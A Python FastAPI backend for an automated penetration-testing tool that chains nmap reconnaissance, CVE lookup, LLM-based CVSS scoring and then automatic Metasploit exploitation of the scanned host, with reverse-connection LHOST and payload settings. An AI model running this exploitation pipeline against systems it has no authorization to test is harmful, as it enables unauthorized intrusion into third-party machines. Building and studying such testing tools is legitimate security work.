import uuid, asyncio, json, os, requests as req
from datetime import datetime
from typing import Optional
from fastapi import APIRouter, Depends, HTTPException, WebSocket, WebSocketDisconnect
from sqlalchemy.orm import Session
from database import get_db
from models import Scan, AuditLog, Notification, RemediationLog, ChatMessage
from schemas import LaunchScanRequest, ScanOut, UpdateRemediation, ChatRequest
from auth import get_current_user, decode_token

router = APIRouter(prefix="/api/scans", tags=["scans"])

OPENROUTER_URL = "https://openrouter.ai/api/v1/chat/completions"
LLM_MODEL      = "google/gemma-4-26b-a4b-it"
try:
    from dotenv import dotenv_values as _dv
    _env = _dv(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), ".env"))
    OPENROUTER_KEY = _env.get("OPENROUTER_API_KEY", "").strip()
except Exception:
    OPENROUTER_KEY = os.getenv("OPENROUTER_API_KEY", "").strip()

import re as _re_valid
def valid_target(t: str) -> bool:
    """Valide une cible : IP, nom de domaine ou URL (reproche #5 - validation de la cible)."""
    t = (t or "").strip()
    t = _re_valid.sub(r'^https?://', '', t)
    host = t.split('/')[0].split(':')[0]
    return bool(host) and len(host) <= 253 and bool(_re_valid.match(r'^[A-Za-z0-9._-]+$', host))

def log(db, event, actor, detail=None, success=True):
    db.add(AuditLog(event_type=event, actor_username=actor, detail=detail, success=success))
    db.commit()

_ws_connections: dict = {}
_scan_events: dict = {}

def emit_event(scan_id: str, event_type: str, agent: str = None, data: dict = None, output: str = None):
    event = {
        "type": event_type,
        "agent": agent,
        "data": data or {},
        "output": output,
        "ts": datetime.utcnow().isoformat()
    }
    if scan_id not in _scan_events:
        _scan_events[scan_id] = []
    _scan_events[scan_id].append(event)

def llm_call(system: str, user_msg: str) -> str:
    try:
        resp = req.post(
            OPENROUTER_URL,
            headers={
                "Authorization": f"Bearer {OPENROUTER_KEY}",
                "Content-Type": "application/json",
                "HTTP-Referer": "http://localhost:5173",
                "X-Title": "N.A.P.T"
            },
            json={
                "model": LLM_MODEL,
                "messages": [
                    {"role": "system", "content": system},
                    {"role": "user", "content": user_msg}
                ]
            },
            timeout=60
        )
        result = resp.json()
        if "error" in result:
            raise Exception(result["error"].get("message", "OpenRouter error"))
        return result["choices"][0]["message"]["content"]
    except Exception as e:
        return f"[LLM indisponible: {e}]"

@router.get("", response_model=list[ScanOut])
def list_scans(db: Session = Depends(get_db), user=Depends(get_current_user)):
    if user.role == "admin":
        return db.query(Scan).order_by(Scan.started_at.desc()).all()
    return db.query(Scan).filter(Scan.started_by_id == user.id).order_by(Scan.started_at.desc()).all()

@router.post("")
def launch_scan(data: LaunchScanRequest, db: Session = Depends(get_db), user=Depends(get_current_user)):
    # Validation de la cible AVANT tout traitement (reproche #5)
    if not valid_target(data.target):
        raise HTTPException(status_code=400, detail="Cible invalide : adresse IP ou nom de domaine attendu.")

    scan_id = str(uuid.uuid4())
    scan = Scan(id=scan_id, target=data.target, target_type=data.target_type,
                status="running", started_by_id=user.id)
    db.add(scan); db.commit()
    log(db, "scan_launched", user.username, f"Target: {data.target}")
    db.add(Notification(user_id=user.id, title="Scan lance",
        message=f"Scan de {data.target} en cours...", type="info", scan_id=scan_id))
    db.commit()
    _scan_events[scan_id] = []

    import threading, subprocess, re, sys

    def run_scan(sid, target):
        if target.startswith("http://") or target.startswith("https://"):
            from urllib.parse import urlparse
            parsed = urlparse(target)
            host = parsed.hostname or target
            port = parsed.port
        else:
            parts = target.split(":")
            host = parts[0]
            port = int(parts[1]) if len(parts) > 1 else None

        from database import SessionLocal
        sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "rag"))
        db2 = SessionLocal()

        cve_id, severity, cvss, summary = None, "low", "0.0", ""
        ports = []
        full_output = ""
        llm_analysis = ""
        exploit_result = ""

        try:
            # AGENT 1: RECONNAISSANCE (sortie XML fiable + fallback regex - reproche #5)
            import xml.etree.ElementTree as ET
            emit_event(sid, "agent_start", "reconnaissance", {"label": "Reconnaissance", "target": host, "port": port})
            xml_path = f"/tmp/napt_nmap_{sid}.xml"
            nmap_cmd = ["nmap", "-sV", "-p", "21,22,23,25,53,80,110,111,135,139,143,443,445,512,513,514,993,995,1099,1433,1521,1524,2049,2121,3306,3389,3632,5432,5900,6000,6379,6667,6697,6699,8009,8080,8180,8443,8787", "-oX", xml_path, "--host-timeout", "180s", host]
            if port:
                nmap_cmd = ["nmap", "-sV", "-p", str(port), "-oX", xml_path, "--host-timeout", "90s", host]
            emit_event(sid, "agent_output", "reconnaissance", output=f"[NAPT_0]$ {' '.join(nmap_cmd)}")
            proc = subprocess.Popen(nmap_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            nmap_lines = []
            for line in proc.stdout:
                line = line.rstrip()
                nmap_lines.append(line)
                emit_event(sid, "agent_output", "reconnaissance", output=line)
            proc.wait()
            full_output = "\n".join(nmap_lines)

            # Parsing XML natif (fiable)
            try:
                tree = ET.parse(xml_path)
                for p in tree.getroot().iter("port"):
                    st = p.find("state")
                    if st is not None and st.get("state") == "open":
                        svc = p.find("service")
                        service = svc.get("name") if svc is not None else ""
                        version = ""
                        if svc is not None:
                            version = " ".join(x for x in [svc.get("product"), svc.get("version")] if x)
                        ports.append({"port": p.get("portid"), "proto": p.get("protocol"),
                                      "service": service, "version": version.strip()})
            except Exception:
                # Fallback regex si le XML n'est pas disponible
                for line in nmap_lines:
                    m = re.match(r"\s*(\d+)/(\w+)\s+open\s+(\S+)\s*(.*)", line)
                    if m:
                        ports.append({"port": m.group(1), "proto": m.group(2),
                                      "service": m.group(3), "version": m.group(4).strip()})
            finally:
                try:
                    os.remove(xml_path)
                except Exception:
                    pass

            latency = None
            for line in nmap_lines:
                lm = re.search(r"\((\d+\.\d+s) latency\)", line)
                if lm:
                    latency = lm.group(1)
            emit_event(sid, "agent_result", "reconnaissance", {"host": host, "latency": latency, "ports": ports, "ports_count": len(ports)})
            emit_event(sid, "agent_complete", "reconnaissance")

            # AGENT 2: RAG LOOKUP (avec seuil de confiance - reproche #3)
            emit_event(sid, "agent_start", "rag_lookup", {"label": "Recherche CVE"})
            SIM_MIN = 0.70
            if ports:
                from searcher import find_cve_for_service
                from service_cve import match_service_cve
                best_score = -1
                best_svc = None
                best_sim = 0.0
                for svc in ports:
                    query_str = f"{svc['service']} {svc['version']}"
                    emit_event(sid, "agent_output", "rag_lookup", output=f"+ rag_query: {query_str}")
                    _det = match_service_cve(svc["service"], svc["version"])
                    if _det:
                        emit_event(sid, "agent_output", "rag_lookup", output="  match direct (empreinte service) -> " + _det["cve_id"])
                        _det_cvss = float(_det["cvss"])
                        if _det_cvss > best_score:
                            best_score = _det_cvss
                            cve_id = _det["cve_id"]
                            severity = _det["severity"]
                            cvss = str(_det_cvss)
                            summary = _det["text"]
                            best_svc = svc
                            best_sim = 1.0
                        continue
                    cves = find_cve_for_service(svc["service"], svc["version"], limit=1)
                    if cves:
                        c = cves[0]
                        sim = float(c.get("score") or 0)
                        emit_event(sid, "agent_output", "rag_lookup", output=f"  similarite {round(sim, 3)} (seuil {SIM_MIN})")
                        if sim < SIM_MIN:
                            continue
                        c_cvss = float(c.get("cvss") or c.get("cvss_score") or 0)
                        if c_cvss > best_score:
                            best_score = c_cvss
                            cve_id = c.get("cve_id")
                            severity = c.get("severity", "low")
                            cvss = str(c_cvss)
                            summary = c.get("text", "")
                            best_svc = svc
                            best_sim = sim
                if cve_id:
                    from searcher import get_remediation
                    reco = get_remediation(cve_id)
                    summary = summary + " || REMEDIATION: " + reco
                    emit_event(sid, "agent_result", "rag_lookup", {"cve_id": cve_id, "cvss": cvss, "severity": severity, "similarity": round(best_sim, 3)})
                    emit_event(sid, "agent_output", "rag_lookup", output=f"CVE trouvee: {cve_id} (CVSS {cvss}, {severity.upper()}, sim {round(best_sim, 3)})")
                else:
                    emit_event(sid, "agent_output", "rag_lookup", output=f"Aucune CVE au-dessus du seuil ({SIM_MIN})")
            else:
                emit_event(sid, "agent_output", "rag_lookup", output="Aucun port ouvert")
            emit_event(sid, "agent_complete", "rag_lookup")

            # AGENT 3: EVALUATION CVSS PAR GEMMA (reproche #1 corrige)
            emit_event(sid, "agent_start", "vulnerability_analysis", {"label": "Analyse de vulnerabilites"})
            if cve_id:
                emit_event(sid, "agent_output", "vulnerability_analysis", output=f"+ Gemma evalue le CVSS de {cve_id} sur {host}...")
                from ai_cvss import evaluate_cvss
                _ev = evaluate_cvss(llm_call, host, ports, cve_id, summary, cvss, severity)
                cvss = _ev["cvss"]
                severity = _ev["severity"]
                llm_analysis = _ev["analysis"]
                for line in llm_analysis.split("\n"):
                    if line.strip():
                        emit_event(sid, "agent_output", "vulnerability_analysis", output=line)
                emit_event(sid, "agent_result", "vulnerability_analysis", {"cve_id": cve_id, "cvss": cvss, "severity": severity, "cvss_vector": _ev["cvss_vector"], "analysis": llm_analysis[:500]})
            else:
                emit_event(sid, "agent_output", "vulnerability_analysis", output="Pas de CVE a analyser - hote semble securise")
                emit_event(sid, "agent_result", "vulnerability_analysis", {"cve_id": None, "cvss": "0.0", "severity": "none", "analysis": "Aucune vulnerabilite critique."})
            emit_event(sid, "agent_complete", "vulnerability_analysis")

            # AGENT 4: EXPLOITATION (METASPLOIT - module fiable, reproche #2)
            emit_event(sid, "agent_start", "exploitation", {"label": "Exploitation"})
            if cve_id:
                from msf_modules import get_msf_module, get_msf_payload
                _ctx = "Services: " + ", ".join(p["service"] + " " + p["version"] for p in ports)
                msf_module, _map_rport, _origin = get_msf_module(cve_id, llm_call, _ctx)
                if not msf_module:
                    emit_event(sid, "agent_output", "exploitation", output=f"Aucun module Metasploit connu pour {cve_id}")
                    emit_event(sid, "agent_result", "exploitation", {"module": None, "target": host, "success": False, "output": "Pas de module"})
                else:
                    _rport = _map_rport or (ports[0]["port"] if ports else 445)
                    emit_event(sid, "agent_output", "exploitation", output=f"+ Module ({_origin}): {msf_module}  RPORT={_rport}")
                    import socket as _sock
                    try:
                        _s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
                        _s.connect(("8.8.8.8", 80))
                        _lhost = _s.getsockname()[0]
                        _s.close()
                    except Exception:
                        _lhost = "127.0.0.1"
                    emit_event(sid, "agent_output", "exploitation", output="+ LHOST (adresse de retour) = " + _lhost)
                    msf_cmd = f"use {msf_module}; set RHOSTS {host}; set RPORT {_rport}; set LHOST {_lhost}; {('set PAYLOAD ' + get_msf_payload(cve_id) + '; ') if get_msf_payload(cve_id) else ''}set VERBOSE true; run -z; exit -y"
                    try:
                        msf_proc = subprocess.Popen(["msfconsole", "-q", "-x", msf_cmd], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                        msf_lines = []
                        import select as _select, time as _time
                        msf_deadline = _time.time() + 180
                        while _time.time() < msf_deadline:
                            ready, _, _ = _select.select([msf_proc.stdout], [], [], 2.0)
                            if ready:
                                line = msf_proc.stdout.readline()
                                if not line:
                                    break
                                line = line.rstrip()
                                msf_lines.append(line)
                                emit_event(sid, "agent_output", "exploitation", output=line)
                            elif msf_proc.poll() is not None:
                                break
                        else:
                            msf_proc.kill()
                            emit_event(sid, "agent_output", "exploitation", output="Timeout 180s - Metasploit arrete")
                        try:
                            msf_proc.stdout.close()
                        except Exception:
                            pass
                        exploit_result = "\n".join(msf_lines)
                        _low = exploit_result.lower()
                        success = ("session" in _low and "opened" in _low) or "meterpreter" in _low
                        emit_event(sid, "agent_result", "exploitation", {"module": msf_module, "target": host, "success": success, "output": exploit_result[:300]})
                        emit_event(sid, "agent_output", "exploitation", output=("EXPLOITATION REUSSIE - session ouverte" if success else "Exploitation non confirmee"))
                    except Exception as msf_err:
                        emit_event(sid, "agent_output", "exploitation", output=f"Metasploit: {msf_err}")
                        emit_event(sid, "agent_result", "exploitation", {"module": msf_module, "target": host, "success": False, "output": str(msf_err)})
            else:
                emit_event(sid, "agent_output", "exploitation", output="Pas de CVE - exploitation ignoree")
                emit_event(sid, "agent_result", "exploitation", {"module": None, "target": host, "success": False, "output": ""})
            emit_event(sid, "agent_complete", "exploitation")

            # AGENT 5: RAPPORT
            emit_event(sid, "agent_start", "report", {"label": "Generation du rapport"})
            emit_event(sid, "agent_output", "report", output="+ Consolidation du rapport...")
            if cve_id:
                emit_event(sid, "agent_output", "report", output=f"+ CVE: {cve_id}  CVSS: {cvss}  Severite: {severity.upper()}")
            emit_event(sid, "agent_output", "report", output="+ Enregistrement en base...")
            s = db2.query(Scan).filter(Scan.id == sid).first()
            if s:
                s.status = "completed"
                s.finished_at = datetime.utcnow()
                s.cve_id = cve_id
                s.severity = severity
                s.cvss_score = cvss
                s.client_summary = summary
                s.raw_output = full_output + "\n\n=== LLM ANALYSIS ===\n" + llm_analysis + "\n\n=== EXPLOIT ===\n" + exploit_result
                db2.commit()
            emit_event(sid, "agent_output", "report", output="Rapport enregistre avec succes")
            emit_event(sid, "agent_complete", "report")
            emit_event(sid, "scan_complete", data={"cve_id": cve_id, "severity": severity, "cvss": cvss})

        except Exception as e:
            import traceback
            emit_event(sid, "agent_error", "report", data={"message": str(e)})
            s = db2.query(Scan).filter(Scan.id == sid).first()
            if s:
                s.status = "failed"
                s.raw_output = traceback.format_exc()
                db2.commit()
        finally:
            db2.close()

    threading.Thread(target=run_scan, args=(scan_id, data.target), daemon=True).start()
    return {"id": scan_id, "target": data.target, "status": "running", "started_at": scan.started_at.isoformat()}


@router.post("/{scan_id}/stop")
def stop_scan(scan_id: str, db: Session = Depends(get_db), user=Depends(get_current_user)):
    scan = db.query(Scan).filter(Scan.id == scan_id).first()
    if not scan:
        raise HTTPException(404, "Scan introuvable")
    scan.status = "stopped"
    scan.finished_at = datetime.utcnow()
    db.commit()
    log(db, "scan_stopped", user.username, f"{scan.target} - manually stopped")
    emit_event(scan_id, "stopped")
    return {"success": True}

@router.get("/nmap-network")
def scan_network(user=Depends(get_current_user)):
    import subprocess, re
    try:
        result = subprocess.run(["nmap", "-sn", "172.22.64.0/20", "--host-timeout", "10s"], capture_output=True, text=True, timeout=60)
        hosts = []
        for line in result.stdout.splitlines():
            ip_match = re.search(r"Nmap scan report for (.+)", line)
            if ip_match:
                hosts.append({"host": ip_match.group(1), "status": "up"})
        return {"network": "172.22.64.0/20", "hosts_found": len(hosts), "hosts": hosts, "raw": result.stdout}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.get("/nmap-target")
def scan_target(host: str, user=Depends(get_current_user)):
    import subprocess, re
    if not valid_target(host):
        raise HTTPException(status_code=400, detail="Cible invalide")
    try:
        result = subprocess.run(["nmap", "-sV", "--top-ports", "100", "--host-timeout", "30s", host], capture_output=True, text=True, timeout=120)
        ports = []
        for line in result.stdout.splitlines():
            m = re.match(r'\s*(\d+/\w+)\s+(\w+)\s+(\S+)\s*(.*)', line)
            if m:
                ports.append({"port": m.group(1), "state": m.group(2), "service": m.group(3), "version": m.group(4).strip()})
        return {"target": host, "ports": ports, "raw": result.stdout}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.get("/{scan_id}", response_model=ScanOut)
def get_scan(scan_id: str, db: Session = Depends(get_db), _=Depends(get_current_user)):
    scan = db.query(Scan).filter(Scan.id == scan_id).first()
    if not scan:
        raise HTTPException(404, "Scan introuvable")
    return scan

@router.patch("/{scan_id}/remediation")
def update_remediation(scan_id: str, data: UpdateRemediation, db: Session = Depends(get_db), user=Depends(get_current_user)):
    scan = db.query(Scan).filter(Scan.id == scan_id).first()
    if not scan:
        raise HTTPException(404, "Scan introuvable")
    old = scan.remediation_status
    scan.remediation_status = data.status
    db.commit()
    db.add(RemediationLog(scan_id=scan_id, old_status=old, new_status=data.status, changed_by=user.username, note=data.note))
    db.commit()
    log(db, "remediation_status_changed", user.username, f"Scan {scan.target} ({scan.cve_id or '?'}): {old} -> {data.status}")
    return {"success": True}

@router.post("/{scan_id}/chat")
def chat(scan_id: str, data: ChatRequest, db: Session = Depends(get_db), user=Depends(get_current_user)):
    scan = db.query(Scan).filter(Scan.id == scan_id).first()
    if not scan:
        raise HTTPException(404)
    db.add(ChatMessage(scan_id=scan_id, role="user", content=data.message))
    db.commit()
    reply = generate_reply(data.message, scan)
    db.add(ChatMessage(scan_id=scan_id, role="assistant", content=reply))
    db.commit()
    return {"reply": reply}

def generate_reply(question: str, scan) -> str:
    try:
        payload = {"model": "mistral", "prompt": f"Tu es un expert en securite. Scan: {scan.target}, CVE: {scan.cve_id}.\nQuestion: {question}", "stream": False}
        r = req.post("http://localhost:11434/api/generate", json=payload, timeout=30)
        return r.json().get("response", "")
    except Exception:
        return f"Concernant {scan.cve_id or 'cette vulnerabilite'} sur {scan.target}: Appliquer les patches de securite et verifier les configurations systeme."

@router.websocket("/{scan_id}/live")
async def ws_live(websocket: WebSocket, scan_id: str):
    token = websocket.query_params.get("token", "")
    payload = decode_token(token)
    if not payload.get("sub"):
        await websocket.close(code=1008)
        return
    await websocket.accept()
    if scan_id not in _ws_connections:
        _ws_connections[scan_id] = []
    _ws_connections[scan_id].append(websocket)
    sent_index = 0
    try:
        while True:
            events = _scan_events.get(scan_id, [])
            while sent_index < len(events):
                await websocket.send_text(json.dumps(events[sent_index]))
                sent_index += 1
            last_types = [e["type"] for e in events[-3:]] if events else []
            if any(t in last_types for t in ["scan_complete", "scan_failed", "stopped"]):
                break
            await asyncio.sleep(0.3)
    except WebSocketDisconnect:
        pass
    except Exception:
        pass
    finally:
        if scan_id in _ws_connections and websocket in _ws_connections[scan_id]:
            _ws_connections[scan_id].remove(websocket)
